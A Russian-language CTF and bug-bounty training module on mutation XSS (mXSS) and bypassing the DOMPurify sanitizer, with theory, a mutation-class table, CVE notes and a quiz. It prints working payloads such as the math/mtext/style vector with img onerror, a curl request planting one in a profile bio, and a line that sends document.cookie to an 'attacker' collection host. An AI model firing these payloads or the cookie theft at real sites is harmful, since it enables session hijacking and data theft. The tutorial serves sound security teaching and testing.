---
id: web-mxss
title: "mXSS и обход санитайзеров (DOMPurify)"
category: web
parent: web-dom-clobbering
difficulty: hard
order: 2
tags: [mxss, xss, dompurify, sanitizer, html-parsing, mutation]
prerequisites: [web-xss, web-dom-clobbering]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Почему браузерный парсер HTML и санитайзер видят разное дерево и как из-за этого проскакивает XSS."
---

**mXSS (mutation XSS)** — это класс XSS, при котором санитайзер один раз разбирает и «очищает» HTML, но браузер при повторном разборе (или при сериализации/вставке) строит **другое** DOM-дерево, и вычищенный тег «мутирует» обратно в исполняемый. Это главный способ обойти DOMPurify-подобные фильтры. Понимание mXSS обязательно для современного XSS-хантинга и задач, где «фильтр точно всё чистит».

## Теория: HTML-парсер не один, и он контекстный

Ключ к mXSS — рассинхронизация между двумя представлениями HTML:

1. **Текст → DOM** (парсинг). Браузер применяет правила tree construction: авто-закрытие тегов, разбор `<table>`, `<svg>`, `<math>`, raw-text элементов (`<style>`, `<textarea>`, `<title>`, `<xmp>`, `<noscript>`), foreign-content (SVG/MathML).
2. **DOM → текст** (сериализация, `innerHTML`). Обратное преобразование даёт строку, которая может **отличаться** от исходной.

Санитайзер обычно: `DOMPurify.sanitize(html)` → возвращает строку → приложение вставляет её в `innerHTML`. Если строка санитайзера при повторной вставке парсится иначе — рождается XSS.

Классические источники мутации:
- **Неправильно вложенные теги** (`<b><i></b></i>`), которые парсер перестраивает.
- **Foreign content (SVG/MathML)** и `namespace confusion`.
- **Raw-text / RCDATA**: `<style>`, `<textarea>`, `<title>` — их содержимое парсится как текст, и `</style>` может «выйти» из контекста при сериализации.
- **`<noscript>`** и его двойная интерпретация.
- **`<template>`** и его содержимое.
- **Comment-based**: `<--!>` и подобные странности.

## Теория: почему DOMPurify иногда пробивается

DOMPurify разбирает вход, чистит и **сериализует**. Он старается не пропускать опасные теги. Но:

- Версии до определённого патча уязвимы к конкретным mXSS-векторам (CVE-2020-26870 в DOMPurify, CVE-2024-45801/45802, и т.д.).
- Если приложение делает `innerHTML = sanitize(x)` **несколько раз** или очищает, а потом добавляет контекст (обёртку), возникает повторный парсинг.
- **Контекст вставки** не совпадает с контекстом очистки (санитайз для `<div>`, вставка внутрь `<table>` или `<svg>`).

Правило: «DOMPurify есть» ≠ «XSS невозможен». Всегда проверяйте **версию** и **как** приложение использует результат.

## Теория: где искать контекст для mXSS

- Rich-text редакторы (профиль, комментарии, bio) с серверной или клиентской очисткой.
- Markdown-рендереры, конвертирующие в HTML, затем sanitize.
- SSR/CSR гидрация, где HTML проходит через `innerHTML`.
- Любой паттерн `el.innerHTML = DOMPurify.sanitize(userInput)`.

## Инструменты и команды

Определить DOMPurify и версию:

```bash
curl -s https://target.local/ | grep -oiE 'dompurify[^"]*\.js'
curl -s https://target.local/js/dompurify.min.js | head -c 200
```

В DevTools проверяйте двойной парсинг вручную:

```js
const s = '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(s);
console.log(clean);           // что вернул санитайзер
const d = document.createElement('div');
d.innerHTML = clean;          // повторный парсинг
console.log(d.innerHTML);     // мутировало ли дерево
```

Набор mXSS-пейлоадов (проверяйте на СВОЁМ стенде и в рамках scope) собирается в репозитории `cure53/DOMPurify` (issues) и в статьях про mXSS. Burp-плагин **DOM Invader** помогает находить sink'и автоматически.

## Разобранный пример: raw-text мутация через `<style>`

Пейлоад, эксплуатирующий разницу парсинга `<style>` (raw text) и foreign content:

```
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
```

Пошагово:

Шаг 1. Отправляем пейлоад в поле с серверной очисткой. Если ответ содержит что-то вроде `<img src=1 onerror=alert(1)>` **не** как текст — очистка не справилась.

Шаг 2. Если очистка клиентская (DOMPurify), проверяем в консоли двойной парсинг (см. выше). Мутация `<style>` внутри `<math>`/`<table>` часто «выпускает» `<img onerror>`.

Шаг 3. Доказываем исполнение: `alert(document.domain)`, затем кража `document.cookie` (если нет HttpOnly) или `localStorage`. В отчёте — точный пейлоад, версия санитайзера и шаги.

## Разобранный пример: mutation при повторном sanitize

Некоторые приложения «двойную» очистку делают так:

```js
let html = sanitize(input);
html = sanitize(html);      // повторно
container.innerHTML = html;
```

Из-за мутации первый результат после сериализации может отличаться от второго парсинга, и на выходе получается исполняемый тег. Всегда воспроизводите реальную цепочку приложения (сколько раз и как вызывается sanitize), а не только голый DOMPurify.

## Частые ошибки

- **Верить, что DOMPurify «непробиваем».** mXSS-баги находятся регулярно; нужна версия и контекст.
- **Тестировать в другом контексте.** Санитайз для `<div>`, а вставка в `<svg>`/`<table>` — это разные модели.
- **Забывать про foreign content.** `<svg>`, `<math>` и их дочерние элементы — основной источник мутаций.
- **Игнорировать raw-text/RCDATA.** `<style>`, `<textarea>`, `<title>`, `<noscript>` — частые точки мутации.
- **Не проверять сериализацию.** Ключ — сравнить `input` → `DOM` → `serialize` → `parse` снова.

## Полный разбор: mXSS через foreign content (с выводом)

End-to-end проверка rich-text поля с клиентской очисткой DOMPurify.

Шаг 1. Определяем санитайзер и версию:

```bash
curl -s https://target.local/ | grep -oiE 'dompurify[^"]*\.js'
# /js/dompurify.min.js
curl -s https://target.local/js/dompurify.min.js | head -c 120
# /*! @license DOMPurify 2.0.0 | ... */
```

Версия `2.0.0` — старее пропатченных; повышаем шанс mXSS.

Шаг 2. В DevTools проверяем, как приложение обрабатывает ввод (сколько раз sanitize, куда вставляет):

```js
// 1) что вернул санитайзер
const raw = '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(raw);
console.log('clean:', clean);

// 2) повторный парсинг (как делает браузер при innerHTML)
const d = document.createElement('div');
d.innerHTML = clean;
console.log('reparsed:', d.innerHTML);   // мутировало ли в <img onerror>
```

Если `reparsed` содержит `<img ... onerror=alert(1)>` вне контекста `<style>` — мутация подтверждена.

Шаг 3. Отправляем payload в реальное поле (комментарий/bio), смотрим, сработал ли `alert`:

```bash
curl -s -X POST https://target.local/profile \
  --data-urlencode 'bio=<math><mtext><table><mglyph><style><img src=x onerror=alert(document.domain)>' \
  -b 'session=me'
```

Шаг 4. Если alert сработал — эскалируем до кражи:

```html
<img src=x onerror="fetch('https://attacker/collect?c='+encodeURIComponent(document.cookie))">
```

В отчёте: точный payload, версия DOMPurify, цепочка вызовов sanitize, доказательство исполнения (скриншот консоли/коллаборатор).

## Reference-таблица: классы mXSS-мутаций

| Класс | Механизм | Пример-намёк |
|-------|----------|--------------|
| Raw-text мутация | `<style>`/`<textarea>`/`<title>` содержимое парсится как текст | `</style>` «выходит» при сериализации |
| Foreign content | SVG/MathML namespace-правила | `<math><mtext><table>...` |
| Неправильная вложенность | авто-закрытие тегов парсером | `<b><i></b></i>` |
| `<noscript>` | двойная интерпретация (с/без JS) | `<noscript><p title="</noscript><img onerror=...>` |
| `<template>` | содержимое шаблона | `<template><img onerror=...>` |
| Comment-based | `<!-- -->` и `<!--!>` | `<--!><img onerror=...>` |
| Namespace confusion | `<svg>` внутри `<p>` и т.п. | границы namespace |
| CDATA/`<![CDATA[` | в foreign content | `<svg><![CDATA[...]]>` |
| Serialization round-trip | DOM→строка→DOM | двойной sanitize |

## Проверка версии DOMPurify и известные CVE

Известные mXSS-уязвимости DOMPurify (патчатся в минорных релизах):

- **CVE-2020-26870** — mXSS в определённых конфигурациях (исправлено в 2.0.17).
- **CVE-2024-45801** — prototype pollution → обход (2.5.4/2.5.6 фиксы).
- **CVE-2024-45802** — mXSS (2.5.4/2.5.6).
- Ряд mXSS-багов в 3.x (3.1.x, 3.2.x) — проверяйте changelog и issues.

Проверка версии и сравнение с последней:

```bash
curl -s https://target.local/js/dompurify.min.js | grep -oE 'DOMPurify [0-9.]+'
# DOMPurify 2.0.0   -> устарела, mXSS вероятен
```

Если приложение использует старую версию, ищите соответствующий mXSS-вектор в issues `cure53/DOMPurify` и воспроизводите на своём стенде.

## DOM Invader и автоматизация

Burp **DOM Invader** (встроен в Burp Browser) автоматически ищет DOM-XSS sink'и, каналы (postMessage, storage, hash) и проверяет, доходит ли ввод до `innerHTML`/`eval`. Рабочий процесс:

1. Включить DOM Invader, задать canary (уникальную строку).
2. Пройтись по приложению; расширение подсветит sink'и и каналы.
3. Вставить mXSS-payload в найденное поле и проверить мутацию.

Дополнительно: `sanitizer-bypass`-коллекции (payloadbox, PortSwigger XSS cheat sheet) и написание собственного fuzzer'а, который сравнивает `parse(sanitize(x))` с `sanitize(parse(x))`.

## Что делать дальше / решение

1. **Определить санитайзер и версию** (DOMPurify/др.).
2. **Проверить двойной парсинг** в DevTools (`input` → `DOM` → `serialize` → `parse`).
3. **Подобрать mXSS-вектор** под версию (raw-text, foreign content, `<noscript>`).
4. **Воспроизвести** на реальном поле, доказать `alert(document.domain)`.
5. **Эскалировать** до кражи (cookie/localStorage/токенов) или действия.
6. **Оформить PoC**: payload, версия, шаги, скриншот.
7. **Проверить контекст вставки** — иногда санитайз для `<div>`, а вставка в `<table>`/`<svg>`.

## mXSS vs stored vs DOM XSS: как классифицировать

- **Reflected XSS:** ввод отражается в ответе сервера без очистки.
- **Stored XSS:** ввод сохраняется и отдаётся другим.
- **DOM XSS:** ввод обрабатывается JS и попадает в опасный sink (`innerHTML`, `eval`).
- **mXSS:** частный случай DOM/stored, где **санитайзер** пропустил, но браузер мутировал разметку при повторном парсинге.

Классификация важна для отчёта и для фикса: при mXSS «лечение» — не только фильтр ввода, но и корректный контекст очистки + обновление санитайзера. Указывайте: sink (`innerHTML`), санитайзер и версию, число повторных парсингов, конкретный класс мутации (raw-text/foreign content/`<noscript>`). Это отличает настоящий mXSS от обычного DOM XSS и повышает качество находки.

## Быстрый тест mXSS

1. Найти sink: `innerHTML`, `insertAdjacentHTML`, `outerHTML`, `document.write`.
2. Найти санитайзер и версию (DOMPurify и т.п.).
3. Сравнить `sanitize(x)` и `parse(sanitize(x))` — если дерево меняется, есть мутация.
4. Подобрать вектор под версию (foreign content/raw-text/`<noscript>`).
5. Доказать `alert(document.domain)`, затем эскалировать.

Если приложение очищает **на сервере** (например, на Go/Java-санитайзере), ищите расхождение между серверным парсером и браузерным — тот же принцип мутации.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "В чём суть mXSS?"
  options:
    - "Сервер возвращает 500"
    - "Санитайзер и браузер строят разное DOM-дерево, и тег «мутирует» в исполняемый"
    - "XSS через cookie"
    - "Отравление DNS"
  answer: 1
  explanation: "Рассинхронизация парсинга/сериализации между санитайзером и браузером."
- question: "Какой элемент чаще всего участвует в raw-text мутациях?"
  options:
    - "`<style>`"
    - "`<h1>`"
    - "`<b>`"
    - "`<p>`"
  answer: 0
  explanation: "`<style>`/`<textarea>`/`<title>` — raw-text/RCDATA, их содержимое парсится как текст."
- question: "Что обязательно проверить, если на сайте стоит DOMPurify?"
  options:
    - "Ничего, он всё чистит"
    - "Версию и то, как приложение использует результат (сколько раз и куда вставляет)"
    - "Только цвет кнопки"
    - "Заголовок `Server`"
  answer: 1
  explanation: "mXSS-баги зависят от версии и от контекста/числа повторных парсингов."
- question: "Как воспроизвести mXSS в DevTools?"
  options:
    - "Сравнить `input` → `DOM` → `serialize` → снова `parse`"
    - "Отключить JavaScript"
    - "Сменить User-Agent"
    - "Включить HTTP/2"
  answer: 0
  explanation: "Нужно увидеть, как дерево меняется между очисткой и повторной вставкой."
- question: "Почему foreign content (SVG/MathML) важен для mXSS?"
  options:
    - "Он ускоряет сайт"
    - "Namespace-правила разбора отличаются и легко рассинхронизируются с HTML-контекстом"
    - "Он блокирует CSP"
    - "Он шифрует данные"
  answer: 1
  explanation: "SVG/MathML парсятся по другим правилам, что и даёт мутации на границах."
```

## Где пригодится

- **CTF (Web):** задачи, где «санитайзер стоит, XSS невозможен» — почти всегда mXSS.
- **Bug bounty:** обход DOMPurify/санитайзеров в rich-text — высокооплачиваемый класс.
- **Пентест:** проверка rich-text полей, markdown-рендереров, SSR-гидрации.
- **Работа (AppSec/Dev):** осознанный выбор контекста очистки, обновление DOMPurify, отказ от двойного sanitize.
